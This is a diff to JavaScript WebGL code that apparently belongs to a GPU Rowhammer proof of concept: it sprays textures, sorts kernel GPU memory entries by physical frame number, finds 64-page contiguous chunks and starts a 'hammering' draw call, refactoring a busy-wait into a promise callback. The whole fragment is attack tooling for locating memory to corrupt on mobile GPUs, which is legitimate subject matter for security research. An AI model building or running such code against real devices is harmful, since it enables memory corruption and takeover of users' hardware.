@@ -380,7 +380,7 @@ async function main() {
     var texs = [];
     var texdata = []; // data has to be not null. could be on demand allocation
     for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) texdata.push(0xffffffff)
-	for (var i = 0; i < 50000; ++i){
+	for (var i = 0; i < 10000; ++i){
 		texs.push(gl.createTexture())
 		gl.bindTexture(gl.TEXTURE_2D, texs[i]);
 		var level = 0;
@@ -403,39 +403,38 @@ async function main() {
 
     var downloadedFlag = false; // very ugly, but I don't want to pu all code in function binded to promise
     var kgsl = {}
-    get_tex_data().then(function(data){kgsl = data; downloadFlag = true;})
-    /* Example of kgsl entry
-     * {
-     * pfn: 28576
-     * tex_id: 112
-     * tex_size: 1114112
-     * v_addr: 2237923328
-     * }
-    */
+    get_tex_data().then(function(data){
+        /* Example of kgsl entry
+        * {
+        * pfn: 28576
+        * tex_id: 112
+        * tex_size: 1114112
+        * v_addr: 2237923328
+        * }
+        */
+        kgsl = data; 
+        kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
+        var kgslmap = []
+        var counter = 1;
+        for(var i = 1; i < kgsl.length; ++i){
+            if(kgsl[i].pfn - kgsl[i - 1].pfn == 0x1000){
+                ++counter;
+                if(counter == 64){
+                    counter = 1;
+                    kgslmap.push(i - 64);
+                }
+            } 
+        }
+        console.log("Detected <" + kgslmap.length + "> contigious chunks...");
+        console.log("HAMMERING MATHAFAKA...");
+        gl.useProgram(prog);
     
-    while(!downloadedFlag); // active waiting, but don't judge me :) 
-
-    kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
-    var kgslmap = []
-    var counter = 1;
-    for(var i = 1; i < kgsl.length; ++i){
-        if(kgsl[i].pfn - kgsl[i - 1].pfn == 0x1000){
-            ++counter;
-            if(counter == 64){
-                counter = 1;
-                kgslmap.push(i - 64);
-            }
-        } 
-    }
-    console.log("Detected <" + kgslmap.length + "> contigious chunks...");
-    console.log("HAMMERING MATHAFAKA...");
-    gl.useProgram(prog);
-
-    gl.clearColor(1, 0, 1, 1);
-    gl.clear(gl.COLOR_BUFFER_BIT);
-
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-
-
+        gl.clearColor(1, 0, 1, 1);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+    
+        gl.drawArrays(gl.TRIANGLES, 0, 3);
+        
+    })
+    
 }
 
